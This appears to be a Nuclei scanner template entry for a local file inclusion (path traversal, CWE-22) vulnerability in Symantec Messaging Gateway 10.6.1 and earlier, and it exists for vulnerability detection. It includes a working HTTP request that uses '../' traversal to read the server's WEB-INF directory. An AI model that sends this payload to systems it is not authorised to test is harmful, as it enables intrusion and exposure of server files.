# Nuclei Template: Symantec Messaging Gateway <=10.6.1 - Local File Inclusion
**Template ID:** symantec-messaging-gateway
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`symantec-messaging-gateway.yaml`)

## Vulnerability Information & PoC

## Description
Symantec Messaging Gateway 10.6.1 and prior are vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/
```

